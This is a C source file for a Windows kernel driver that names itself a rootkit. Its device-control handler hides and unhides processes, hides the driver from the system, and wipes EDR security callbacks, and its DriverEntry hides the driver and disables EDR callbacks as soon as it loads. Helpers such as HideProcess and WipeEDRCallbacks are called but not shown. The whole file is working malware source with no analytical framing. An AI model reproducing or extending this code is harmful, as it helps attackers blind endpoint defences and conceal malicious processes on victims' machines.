#include "rootkit.h"

OFFSETS       g_Offsets         = { 0x440, 0x448, 0x5A8, 0x5E0, 0x87A };
LIST_ENTRY    g_HiddenProcessList;
KSPIN_LOCK    g_HiddenProcessLock;
PDRIVER_OBJECT g_DriverObject   = NULL;

VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    UNICODE_STRING symlink = RTL_CONSTANT_STRING(ROOTKIT_SYMLINK_NAME);
    IoDeleteSymbolicLink(&symlink);
    IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS IrpDefault(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS IrpDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);

    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG  code   = stack->Parameters.DeviceIoControl.IoControlCode;
    PVOID  buf    = Irp->AssociatedIrp.SystemBuffer;
    ULONG  inLen  = stack->Parameters.DeviceIoControl.InputBufferLength;
    NTSTATUS status = STATUS_INVALID_PARAMETER;

    switch (code) {
        case IOCTL_HIDE_PROCESS: {
            if (inLen >= sizeof(HIDE_PROCESS_REQUEST)) {
                status = HideProcess(((PHIDE_PROCESS_REQUEST)buf)->ProcessId);
            }
            break;
        }
        case IOCTL_UNHIDE_PROCESS: {
            if (inLen >= sizeof(HIDE_PROCESS_REQUEST)) {
                status = UnhideProcess(((PHIDE_PROCESS_REQUEST)buf)->ProcessId);
            }
            break;
        }
        case IOCTL_HIDE_DRIVER: {
            HideDriver(g_DriverObject);
            status = STATUS_SUCCESS;
            break;
        }
        case IOCTL_WIPE_CALLBACKS: {
            WipeEDRCallbacks();
            status = STATUS_SUCCESS;
            break;
        }
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    g_DriverObject = DriverObject;

    ResolveOffsets();
    InitializeListHead(&g_HiddenProcessList);
    KeInitializeSpinLock(&g_HiddenProcessLock);

    UNICODE_STRING devName = RTL_CONSTANT_STRING(ROOTKIT_DEVICE_NAME);
    PDEVICE_OBJECT devObj  = NULL;

    NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName,
                                     FILE_DEVICE_UNKNOWN, 0, FALSE, &devObj);
    if (!NT_SUCCESS(status)) return status;

    UNICODE_STRING symlink = RTL_CONSTANT_STRING(ROOTKIT_SYMLINK_NAME);
    status = IoCreateSymbolicLink(&symlink, &devName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(devObj);
        return status;
    }

    for (ULONG i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
        DriverObject->MajorFunction[i] = IrpDefault;

    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceControl;
    DriverObject->DriverUnload = DriverUnload;

    devObj->Flags |= DO_BUFFERED_IO;
    devObj->Flags &= ~DO_DEVICE_INITIALIZING;

    HideDriver(DriverObject);
    WipeEDRCallbacks();

    return STATUS_SUCCESS;
}
